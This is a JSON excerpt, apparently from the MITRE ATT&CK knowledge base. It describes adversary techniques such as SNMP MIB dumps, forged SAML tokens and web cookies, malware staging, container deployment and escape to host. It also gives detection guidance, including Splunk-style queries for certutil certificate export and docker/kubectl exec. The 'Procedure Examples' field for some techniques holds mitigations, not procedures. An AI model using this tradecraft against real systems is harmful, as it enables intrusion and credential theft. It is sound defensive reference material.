    "Name": "Data from Configuration Repository:SNMP (MIB Dump)",
    "Description": "Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).The MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages[1]. The MIB may also contain device operational information, including running configuration, routing table, and interface details.Adversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.[2][3]",
    "Detects": [
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts or uncommon data flows. Consider analyzing packet contents to detect application layer protocols, leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows(e.g. snmp traffic originating from unauthorized or untrusted hosts, signature detection for strings mapped to device configuration(s), and anomolies in snmp request(s))",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flow (e.g. snmp traffic originating from unauthorized or untrusted hosts, signature detection for strings mapped to device configuration(s), and anomolies in snmp request(s))"
    ],
    "Procedure Examples": [
      "Configure SNMPv3 to use the highest level of security (authPriv) available.[4]",
      "Apply extended ACLs to block unauthorized protocols outside the trusted network.[4]",
      "Configure intrusion prevention devices to detect SNMP queries and commands from unauthorized sources.[2]",
      "Segregate SNMP traffic on a separate management network.[4]",
      "Allowlist MIB objects and implement SNMP views.[5]",
      "Keep system images and software updated and migrate to SNMPv3.[3]"
    ]
  },
  "T1602.002": {
    "Name": "Data from Configuration Repository:Network Device Configuration Dump",
    "Description": "Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.Adversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.[1][2]These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis.",
    "Detects": [
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts or uncommon data flows. Consider analyzing packet contents to detect application layer protocols, leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g. unauthorized, gratuitous, or anomalous traffic patterns attempting to access network configuration content)",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g. unauthorized, gratuitous, or anomalous traffic patterns attempting to access network configuration content)"
    ],
    "Procedure Examples": [
      "Salt Typhoonhas attempted to acquire credentials by dumping network device configurations.[3]"
    ]
  },
  "T1606": {
    "Name": "Forge Web Credentials",
    "Description": "Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.Adversaries may generate these credential materials in order to gain access to web resources. This differs fromSteal Web Session Cookie,Steal Application Access Token, and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users.The generation of web credentials often requires secret values, such as passwords,Private Keys, or other cryptographic seed values.[1]Adversaries may also forge tokens by taking advantage of features such as theAssumeRoleandGetFederationTokenAPIs in AWS, which allow users to request temporary security credentials (i.e.,Temporary Elevated Cloud Access), or thezmprov gdpakcommand in Zimbra, which generates a pre-authentication key that can be used to generate tokens for any user in the domain.[2][3]Once forged, adversaries may use these web credentials to access resources (ex:Use Alternate Authentication Material), which may bypass multi-factor and other authentication protection mechanisms.[4][5][6]",
    "Detects": [
      "Monitor for anomalous authentication activity, such as logons or other user session activity associated with unknown accounts and/or using SAML tokens which do not have corresponding 4769 and 1200 events in the domain.[9]. Monitor for unexpected and abnormal access to resources, including access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations. These logins may occur on any on-premises resources as well as from any cloud environment that trusts the credentials.[6]",
      "Monitor for creation of access tokens using SAML tokens which do not have corresponding 4769 and 1200 events in the domain.[9]Additionally, detect on unusual API calls to generate access tokens, such assts:GetFederationTokenin AWS.[8]",
      "Monitor for the use of Access Tokens to access services such as Email that were created using SAML tokens which do not have corresponding 1202 events in the domain.[9]"
    ],
    "Procedure Examples": [
      "Administrators should perform an audit of all access lists and the permissions they have been granted to access web applications and services. This should be done extensively on all resources in order to establish a baseline, followed up on with periodic audits of new or updated resources. Suspicious accounts/credentials should be investigated and removed.Enable advanced auditing on ADFS. Check the success and failure audit options in the ADFS Management snap-in. Enable Audit Application Generated events on the AD FS farm via Group Policy Object.[7]",
      "Restrict permissions and access to the AD FS server to only originate from privileged access workstations.[7]",
      "Configure browsers/applications to regularly delete persistent web credentials (such as cookies).",
      "Ensure that user accounts with administrative rights follow best practices, including use of privileged access workstations, Just in Time/Just Enough Administration (JIT/JEA), and strong authentication. Reduce the number of users that are members of highly privileged Directory Roles.[6]In AWS environments, prohibit users from calling thests:GetFederationTokenAPI unless explicitly required.[8]"
    ]
  },
  "T1606.001": {
    "Name": "Forge Web Credentials:Web Cookies",
    "Description": "Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.Adversaries may generate these cookies in order to gain access to web resources. This differs fromSteal Web Session Cookieand other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.[1]The generation of web cookies often requires secret values, such as passwords,Private Keys, or other cryptographic seed values.Once forged, adversaries may use these web cookies to access resources (Web Session Cookie), which may bypass multi-factor and other authentication protection mechanisms.[2][1][3]",
    "Detects": [
      "Monitor for anomalous authentication activity, such as logons or other user session activity associated with unknown accounts. Monitor for unexpected and abnormal access to resources, including access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.",
      "Monitor for the usage of unexpected or unusual cookies to access resources and services. Forged web cookies may be associated with unknown accounts and could be the result of compromised secrets such as passwords orPrivate Keys."
    ],
    "Procedure Examples": [
      "During theSolarWinds Compromise,APT29bypassed MFA set on OWA accounts by generating a cookie value from a previously stolen secret key.[2]"
    ]
  },
  "T1606.002": {
    "Name": "Forge Web Credentials:SAML Tokens",
    "Description": "An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.[1]The default lifetime of a SAML token is one hour, but the validity period can be specified in theNotOnOrAftervalue of theconditions ...element in a token. This value can be changed using theAccessTokenLifetimein aLifetimeTokenPolicy.[2]Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.[3]An adversary may utilizePrivate Keysto compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.[4]This differs fromSteal Application Access Tokenand other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.An adversary may gain administrative Entra ID privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead toUse Alternate Authentication Material, which may bypass multi-factor and other authentication protection mechanisms.[4]",
    "Detects": [
      "Monitor for logins using SAML tokens which do not have corresponding 4769 and 1200 events in the domain.[10]These logins may occur on any on-premises resources as well as from any cloud environment that trusts the certificate.[4]",
      "Consider modifying SAML responses to include custom elements for each service provider. Monitor these custom elements in service provider access logs to detect any anomalous requests.[10]",
      "This search looks for arguments to certutil.exe indicating the manipulation or extraction of Certificate. This certificate can then be used to sign new authentication tokens specially inside Federated environments such as Windows ADFS.Analytic 1 - Certutil.exe Certificate Extraction(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") AND Image= \"C:\\Windows\\System32\\certutil.exe\" AND CommandLine= \"-exportPFX\")",
      "Monitor for user authentication attempts, when requesting access tokens to services, that failed because of Conditional Access Policies (CAP). Some SAML tokens features, such as the location of a user, may not be as easy to claim.",
      "Monitor for creation of access tokens using SAML tokens which do not have corresponding 4769 and 1200 events in the domain.[10]",
      "Monitor for the use of access tokens to access services such as email that were created using SAML tokens which do not have corresponding 1202 events (i.e. \"The Federation Service validated a new credential\") in the domain.[10]"
    ],
    "Procedure Examples": [
      "AADInternalscan be used to create SAML tokens using the AD Federated Services token signing certificate.[5]",
      "During theSolarWinds Compromise,APT29created tokens using compromised SAML signing certificates.[6][7]"
    ]
  },
  "T1608": {
    "Name": "Stage Capabilities",
    "Description": "Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed (Develop Capabilities) or obtained (Obtain Capabilities) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.[1][2][3][4][5]Staging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):Staging web resources necessary to conductDrive-by Compromisewhen a user browses to a site.[6][7][8]Staging web resources for a link target to be used with spearphishing.[9][10]Uploading malware or tools to a location accessible to a victim network to enableIngress Tool Transfer.[1]Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex:Asymmetric CryptographywithWeb Protocols).[11]",
    "Detects": [
      "If infrastructure or patterns in malware, tooling, certificates, or malicious web content have been previously identified, internet scanning may uncover when an adversary has staged their capabilities.Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as initial access and post-compromise behaviors."
    ],
    "Procedure Examples": [
      "Mustang Pandahas used servers under their control to validate tracking pixels sent to phishing victims.[12]"
    ]
  },
  "T1608.001": {
    "Name": "Stage Capabilities:Upload Malware",
    "Description": "Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enableIngress Tool Transferby placing it on an Internet accessible web server.Malware may be placed on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.[1][2]Adversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files viaUser Execution.Masqueradingmay increase the chance of users mistakenly executing these files.",
    "Detects": [
      "If infrastructure or patterns in malware have been previously identified, internet scanning may uncover when an adversary has staged malware to make it accessible for targeting.Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle, such asUser ExecutionorIngress Tool Transfer."
    ],
    "Procedure Examples": [
      "APT32has hosted malicious payloads in Dropbox, Amazon S3, and Google Drive for use during targeting.[1]",
      "APT42has used its infrastructure for C2 and for staging the VINETHORN payload, which masqueraded as a VPN application.[3]",
      "BITTERhas registered domains to stage payloads.[4]",
      "BlackBytehas staged tools such asCobalt Strikeat public file sharing and hosting sites.[5]",
      "ForC0010, UNC3890 actors staged malware on their infrastructure for direct download onto a compromised system.[6]",
      "ForC0011,Transparent Tribehosted malicious documents on domains registered by the group.[7]",
      "ForC0021, the threat actors uploaded malware to websites under their control.[8][9]",
      "Earth Luscahas staged malware and malicious files on compromised web servers, GitHub, and Google Drive.[10]",
      "EXOTIC LILYhas uploaded malicious payloads to file-sharing services including TransferNow, TransferXL, WeTransfer, and OneDrive.[11]",
      "FIN7has staged legitimate software, that was trojanized to contain an Atera agent installer, on Amazon S3.[12]",
      "Gamaredon Grouphas registered domains to stage payloads.[13][14]",
      "HEXANEhas staged malware on fraudulent websites set up to impersonate targeted organizations.[15]",
      "Kimsukyhas used compromised and acquired infrastructure to host and deliver malware including Blogspot to host beacons, file exfiltrators, and implants.[16][17][18]",
      "LazyScripterhas hosted open-source remote access Trojans used in its operations in GitHub.[19]",
      "LuminousMothhas hosted malicious payloads on Dropbox.[20]",
      "Moonstone Sleetstaged malicious capabilities online for follow-on download by victims or malware.[21]",
      "Mustang Pandahas hosted malicious payloads on DropBox includingPlugX.[22]",
      "Mustard Tempesthas hosted payloads on acquired second-stage servers for periods of either days, weeks, or months.[23]",
      "DuringNight Dragon, threat actors uploaded commonly available hacker tools to compromised web servers.[24]",
      "OilRighas hosted malware on fake websites designed to target specific audiences.[25]",
      "ForOperation Dream Job,Lazarus Groupused compromised servers to host malware.[26][27][28][29]",
      "ForOperation Sharpshooter, the threat actors staged malicious files on Dropbox and other websites.[30]",
      "ForOperation Spalax, the threat actors staged malware and malicious files in legitimate hosting services such as OneDrive or MediaFire.[31]",
      "Mustang Pandastaged malware on adversary-controlled domains and cloud storage instances duringRedDelta Modified PlugX Infection Chain Operations.[32]",
      "Saint Bearhas used the Discord content delivery network for hosting malicious content referenced in links and emails.[33]",
      "Sandworm Teamstaged compromised versions of legitimate software installers in forums to enable initial access to executing user.[34]",
      "SideCopyhas used compromised domains to host its malicious payloads.[35]",
      "Star Blizzardhas uploaded malicious payloads to cloud storage sites.[36]",
      "TA2541has uploaded malware to various platforms including Google Drive, Pastetext, Sharetext, and GitHub.[37][38]",
      "TA505has staged malware on actor-controlled domains.[39]",
      "TeamTNThas uploaded backdoored Docker images to Docker Hub.[40]",
      "Threat Group-3390has hosted malicious payloads on Dropbox.[41]"
    ]
  },
  "T1608.002": {
    "Name": "Stage Capabilities:Upload Tool",
    "Description": "Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex:PsExec). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enableIngress Tool Transferby placing it on an Internet accessible web server.Tools may be placed on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure).[1]Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.[2][3][4]Adversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.",
    "Detects": [
      "If infrastructure or patterns in tooling have been previously identified, internet scanning may uncover when an adversary has staged tools to make them accessible for targeting.Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle, such asIngress Tool Transfer."
    ],
    "Procedure Examples": [
      "ForC0010, UNC3890 actors staged tools on their infrastructure to download directly onto a compromised system.[5]",
      "ForOperation Dream Job,Lazarus Groupused multiple servers to host malicious tools.[6]",
      "Threat Group-3390has staged tools, includinggsecdumpand WCE, on previously compromised websites.[1]"
    ]
  },
  "T1608.003": {
    "Name": "Stage Capabilities:Install Digital Certificate",
    "Description": "Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.[1]Adversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex:Asymmetric CryptographywithWeb Protocols) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers.Adversaries can obtain digital certificates (seeDigital Certificates) or create self-signed certificates (seeDigital Certificates). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired (Acquire Infrastructure) or previously compromised (Compromise Infrastructure).",
    "Detects": [
      "Consider use of services that may aid in the tracking of certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.[3]Detection efforts may be focused on related behaviors, such asWeb ProtocolsorAsymmetric Cryptography."
    ],
    "Procedure Examples": [
      "Sea Turtlecaptured legitimate SSL certificates from victim organizations and installed these onSea Turtle-controlled infrastructure to enable subsequent adversary-in-the-middle operations.[2]"
    ]
  },
  "T1608.004": {
    "Name": "Stage Capabilities:Drive-by Target",
    "Description": "Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as inDrive-by Compromise. In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such asApplication Access Token. Prior toDrive-by Compromise, adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired (Acquire Infrastructure) or previously compromised (Compromise Infrastructure).Adversaries may upload or inject malicious web content, such asJavaScript, into websites.[1][2]This may be done in a number of ways, including:Inserting malicious scripts into web pages or other user controllable web content such as forum postsModifying script files served to websites from publicly writeable cloud storage bucketsCrafting malicious web advertisements and purchasing ad space on a website through legitimate ad providers (i.e.,Malvertising)In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as inGather Victim Host Information) to ensure it is vulnerable prior to attempting exploitation.[3]Websites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (Domains) to help facilitateDrive-by Compromise.",
    "Detects": [
      "If infrastructure or patterns in the malicious web content utilized to deliver aDrive-by Compromisehave been previously identified, internet scanning may uncover when an adversary has staged web content for use in a strategic web compromise.Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on other phases of the adversary lifecycle, such asDrive-by CompromiseorExploitation for Client Execution."
    ],
    "Procedure Examples": [
      "APT32has stood up websites containing numerous articles and content scraped from the Internet to make them appear legitimate, but some of these pages include malicious JavaScript to profile the potential victim or infect them via a fake software update.[4]",
      "ForC0010, the threat actors compromised the login page of a legitimate Israeli shipping company and likely established a watering hole that collected visitor information.[5]",
      "CURIUMused strategic website compromise to fingerprint then target victims.[6]",
      "Dragonflyhas compromised websites to redirect traffic and to host exploit kits.[7]",
      "FIN7has compromised a digital product website and modified multiple download links to point to trojanized versions of offered digital products.[8]",
      "LuminousMothhas redirected compromised machines to an actor-controlled webpage through HTML injection.[9]",
      "Mustard Tempesthas injected malicious JavaScript into compromised websites to infect victims via drive-by download.[10][11][12][13]",
      "Threat Group-3390has embedded malicious code into websites to screen a potential victim's IP address and then exploit their browser if they are of interest.[2]",
      "Transparent Tribehas set up websites with malicious hyperlinks and iframes to infect targeted victims withCrimson,njRAT, and other malicious tools.[14][15][16]"
    ]
  },
  "T1608.005": {
    "Name": "Stage Capabilities:Link Target",
    "Description": "Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as inMalicious Link. Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as inSpearphishing Link) or a phish to gain initial access to a system (as inSpearphishing Link), an adversary must set up the resources for a link target for the spearphishing link.Typically, the resources for a link target will be an HTML page that may include some client-side script such asJavaScriptto decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials duringSpearphishing Link.[1][2]Adversaries may alsoUpload Malwareand have the link target point to malware for download/execution by the user.Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (Domains) to help facilitateMalicious Link.Links can be written by adversaries to mask the true destination in order to deceive victims by abusing the URL schema and increasing the effectiveness of phishing.[3][4]Adversaries may also use free or paid accounts on link shortening services and Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked while redirecting victims to malicious pages.[5][6][7][8]In addition, adversaries may serve a variety of malicious links through uniquely generated URIs/URLs (including one-time, single use links).[9][10][11][12]Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.[13]",
    "Detects": [
      "If infrastructure or patterns in malicious web content have been previously identified, internet scanning may uncover when an adversary has staged web content to make it accessible for targeting.Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on other phases of the adversary lifecycle, such as duringSpearphishing Link,Spearphishing Link, orMalicious Link."
    ],
    "Procedure Examples": [
      "LuminousMothhas created a link to a Dropbox file that has been used in their spear-phishing operations.[14]",
      "Silent Librarianhas cloned victim organization login pages and staged them for later use in credential harvesting campaigns.Silent Librarianhas also made use of a variety of URL shorteners for these staged websites.[15][1][2]"
    ]
  },
  "T1608.006": {
    "Name": "Stage Capabilities:SEO Poisoning",
    "Description": "Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site’s ranking/score/reputation calculated by their web crawlers and algorithms.[1][2]To help facilitateDrive-by Compromise, adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such asDrive-by Target) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).[3][1]In addition to internet search engines (such as Google), adversaries may also aim to manipulate specific in-site searches for developer platforms (such as GitHub) to deceive users towardsSupply Chain Compromiselures. In-site searches will rank search results according to their own algorithms and metrics such as popularity[4]which may be targeted and gamed by malicious actors.[5]Adversaries may also purchase or plant incoming links to staged capabilities in order to boost the site’s calculated relevance and reputation.[2][6]SEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.[3][7]",
    "Detects": [
      "If infrastructure or patterns in the malicious web content related to SEO poisoning orDrive-by Targethave been previously identified, internet scanning may uncover when an adversary has staged web content supporting a strategic web compromise. Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on other phases of the adversary lifecycle, such asDrive-by CompromiseorExploitation for Client Execution."
    ],
    "Procedure Examples": [
      "Mustard Tempesthas poisoned search engine results to return fake software updates in order to distribute malware.[8][9]"
    ]
  },
  "T1609": {
    "Name": "Container Administration Command",
    "Description": "Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.[1][2][3]In Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such asdocker execto execute a command within a running container.[4][5]In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such askubectl exec.[6]",
    "Detects": [
      "Monitor command execution within containers to detect suspicious activity. Commands executed via Docker (docker exec) or Kubernetes (kubectl exec) should be captured along with relevant metadata.Analytic 1 -  Unusual command executions in container servicessourcetype=docker:daemon OR sourcetype=kubernetes:apiserver| search command IN (\"docker exec\", \"kubectl exec\")",
      "Track the creation of new processes within a container environment, which could indicate suspicious activity initiated via the Docker daemon or Kubernetes API server.Analytic 1 - Unusual process creation within containerssourcetype=docker:daemon OR sourcetype=kubernetes:container| search action=\"start\" OR action=\"exec\""
    ],
    "Procedure Examples": [
      "Hildegardwas executed through the kubelet API run command and by executing commands on running containers.[7]",
      "Kinsingwas executed with an Ubuntu container entry point that runs shell scripts.[8]",
      "Peiratescan usekubectlor the Kubernetes API to run commands.[9]",
      "Siloscapecan send kubectl commands to victim clusters through an IRC channel and can run kubectl locally to spread once within a victim cluster.[10]",
      "TeamTNTexecutedHildegardthrough the kubelet API run command and by executing commands on running containers.[7]"
    ]
  },
  "T1610": {
    "Name": "Deploy Container",
    "Description": "Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order toEscape to Hostand access other containers running on the node.[1]Containers can be deployed by various means, such as via Docker'screateandstartAPIs or via a web application such as the Kubernetes dashboard or Kubeflow.[2][3][4]In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes.[5]Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.[6]",
    "Detects": [
      "Monitor application logs for any unexpected or suspicious container deployment activities through the management API or service-specific logs (e.g., Docker Daemon logs, Kubernetes event logs).Analytic 1 - Container creation and start activities in Docker and Kubernetessourcetype=docker:daemon OR sourcetype=kubernetes:event| where action IN (\"create\", \"start\")",
      "Monitor container creation to detect suspicious or unknown images being deployed. Ensure that only authorized images are being used in the environment, especially in sensitive areas.Analytic 1 - Creation of unexpected or unauthorized containerssourcetype=docker:daemon OR sourcetype=kubernetes:event| search action=\"create\"| where image NOT IN (\"known_images_list\")",
      "Monitor for the start of containers, especially those not aligned with expected images or known administrative schedules.Analytic 1 - Unexpected container startssourcetype=docker:daemon OR sourcetype=kubernetes:event| search action=\"start\"| where user NOT IN (\"known_admins\")",
      "Monitor for newly constructed pods that may deploy a container into an environment to facilitate execution or evade defenses.",
      "Monitor for changes made to pods for unexpected modifications to settings and/or control data that may deploy a container into an environment to facilitate execution or evade defenses."
    ],
    "Procedure Examples": [
      "Dokiwas run through a deployed container.[7]",
      "Kinsingwas run through a deployed Ubuntu container.[8]",
      "Peiratescan deploy a pod that mounts its node’s root file system, then execute a command to create a reverse shell on the node.[9]",
      "TeamTNThas deployed different types of containers into victim environments to facilitate execution.[10][11]TeamTNThas also transferred cryptocurrency mining software to Kubernetes clusters discovered within local IP address ranges.[12]"
    ]
  },
  "T1611": {
    "Name": "Escape to Host",
    "Description": "Adversaries may break out of a container or virtualized environment to gain access to the underlying host. This can allow an adversary access to other containerized or virtualized resources from the host level or to the host itself. In principle, containerized / virtualized resources should provide a clear separation of application functionality and be isolated from the host environment.[1]There are multiple ways an adversary may escape from a container to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such asunshareandkeyctlto escalate privileges and steal secrets.[2][3][4][5][6][7]Additionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such asdocker.sock, to break out of the container via aContainer Administration Command.[5]Adversaries may also escape viaExploitation for Privilege Escalation, such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.[8]In ESXi environments, an adversary may exploit a vulnerability in order to escape from a virtual machine into the hypervisor.[9]Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers or virtual machines running on the host, or setting up a command and control channel on the host.",
    "Detects": [
      "Monitor for the deployment of suspicious or unknown container images and pods in your environment, particularly containers running as root.",
      "Monitor for the installation of kernel modules that could be abused to escape containers on a host.",
      "Monitor for unexpected usage of syscalls such asmountthat may indicate an attempt to escape from a privileged container to host.",
      "Monitor for process activity (such as unexpected processes spawning outside a container and/or on a host) that might indicate an attempt to escape from a privileged container to host.",
      "Monitor cluster-level (Kubernetes) data and events associated with changing containers' volume configurations."
    ],
    "Procedure Examples": [
      "Doki’s container was configured to bind the host root directory.[4]",
      "Hildegardhas used the BOtB tool that can break out of containers.[10]",
      "Peiratescan gain a reverse shell on a host node by mounting the Kubernetes hostPath.[11]",
      "Siloscapemaps the host’s C drive to the container by creating a global symbolic link to the host through the calling ofNtSetInformationSymbolicLink.[12]",
      "TeamTNThas deployed privileged containers that mount the filesystem of victim machine.[13][14]"
    ]
  },
  "T1612": {
    "Name": "Build Image on Host",
    "Description": "Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remotebuildrequest may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.[1]An adversary may take advantage of thatbuildAPI to build a custom image on the host that includes malware downloaded from their C2 server, and then they may utilizeDeploy Containerusing that custom image.[2][3]If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment.",
    "Detects": [
      "Monitor for unexpected Docker image build requests to the Docker daemon on hosts in the environment.",
      "Monitor for established network communications with anomalous IPs that have never been seen before in the environment that may indicate the download of malicious code.",
      "Monitor for network traffic associated with requests and/or downloads of container images, especially those that may be anomalous or known malicious.",
      "Monitor for established network communications with anomalous IPs that have never been seen before in the environment that may indicate the download of malicious code."
    ],
    "Procedure Examples": [
      "Audit images deployed within the environment to ensure they do not contain any malicious components.",
      "Limit communications with the container service to local Unix sockets or remote access via SSH. Require secure port access to communicate with the APIs over TLS by disabling unauthenticated access to the Docker API on port 2375. Instead, communicate with the Docker API over TLS on port 2376.[4]",
      "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls.",
      "Ensure containers are not running as root by default. In Kubernetes environments, consider defining Pod Security Standards that prevent pods from running privileged containers.[5]"
    ]
  },
  "T1613": {
    "Name": "Container and Resource Discovery",
